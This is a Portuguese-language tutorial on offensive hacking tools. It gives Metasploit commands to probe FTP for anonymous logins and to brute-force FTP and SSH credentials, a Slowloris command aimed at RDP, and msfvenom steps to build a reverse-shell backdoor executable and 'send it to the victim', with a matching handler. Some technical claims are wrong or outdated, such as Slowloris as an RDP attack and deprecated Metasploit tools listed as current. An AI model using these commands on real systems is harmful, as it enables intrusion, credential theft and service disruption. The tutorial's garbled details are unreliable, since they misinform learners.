# Ferramentas de Cibersegurança: Conceitos e Práticas

Este documento descreve ferramentas e técnicas para exploração de vulnerabilidades em sistemas, com foco em ferramentas práticas como o Metasploit, ataques DoS e backdoors, além de métodos de prevenção.

---

## 1. Explorando Falhas no FTP

### Conceito
FTP (File Transfer Protocol) é um dos métodos mais antigos de compartilhamento de dados. Apesar de amplamente usado, apresenta várias vulnerabilidades, como:

- **Autenticação anônima:** permite acesso sem credenciais.
- **Directory traversal attack:** exploração de diretórios não autorizados.
- **Cross-site scripting:** injeção de scripts maliciosos.
- **Dridex:** malware direcionado ao protocolo FTP.

### Ferramenta: Metasploit
O Metasploit é uma das plataformas mais utilizadas para exploração de vulnerabilidades. Seus principais componentes incluem:

- **msfconsole:** interface de linha de comando.
- **msfweb:** interface gráfica acessível via navegador.
- **msfpayload:** geração e personalização de payloads.
- **msfcli:** automação de invasões.
- **msflogdump:** exibição de logs de invasão.

### Prática
Para explorar vulnerabilidades no FTP usando o Metasploit:
1. Identifique o IP do alvo e as portas abertas.
2. Use o módulo `auxiliary/scanner/ftp/anonymous` para verificar autenticação anônima.
3. Realize ataques de brute force com o módulo `auxiliary/scanner/ftp/ftp_login`.

```bash
msfconsole
use auxiliary/scanner/ftp/anonymous
set RHOSTS <IP_DO_ALVO>
run
```

---

## 2. Ataque DoS no RDP

### Conceito
O Remote Desktop Protocol (RDP) é usado para acessar sistemas remotamente. Ataques de negação de serviço (DoS) podem explorar fraquezas no protocolo, como força bruta ou exploração de pacotes.

### Prevenção
Medidas para proteger o RDP incluem:
- Implementação de autenticação multifator.
- Configuração de políticas de bloqueio após tentativas de login fracassadas.
- Uso de firewalls para limitar o acesso.

### Prática
Simulação de ataque DoS em RDP usando scripts:
1. Identifique a porta 3389.
2. Use ferramentas como Slowloris para sobrecarregar o serviço RDP.

```bash
sudo slowloris <IP_DO_ALVO> -p 3389 -s 200
```

---

## 3. Explorando Falhas no SSH

### Conceito
SSH (Secure Shell) é usado para comunicação remota e geralmente opera na porta 22. Vulnerabilidades podem ser exploradas via ataques de força bruta.

### Prática com Metasploit
1. Configure uma lista de usuários e senhas.
2. Use o módulo `auxiliary/scanner/ssh/ssh_login` para encontrar credenciais.

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP_DO_ALVO>
set USER_FILE <ARQUIVO_DE_USUARIOS>
set PASS_FILE <ARQUIVO_DE_SENHAS>
run
```

---

## 4. Adicionando Backdoor em Executáveis

### Conceito
Um backdoor permite acesso não autorizado a um sistema, geralmente mascarado como um arquivo legítimo. Exemplos incluem:
- **Spyware:** monitoramento de atividades.
- **Ransomware:** criptografia de dados para extorsão.

### Prática
1. Crie um payload com o Metasploit:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f exe -o backdoor.exe
```

2. Envie o executável para a vítima e configure o handler no Metasploit:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <SEU_IP>
set LPORT 4444
exploit
```

---

## Conclusão

As ferramentas e técnicas descritas acima são amplamente usadas para demonstrações práticas de exploração de vulnerabilidades e conscientização sobre segurança. Recomenda-se o uso em ambientes controlados e com permissão para evitar implicações legais.

---

### Referências
- Documentação do Metasploit: [Metasploit Framework](https://www.metasploit.com/)
- Boas práticas de segurança: [OWASP](https://owasp.org/)

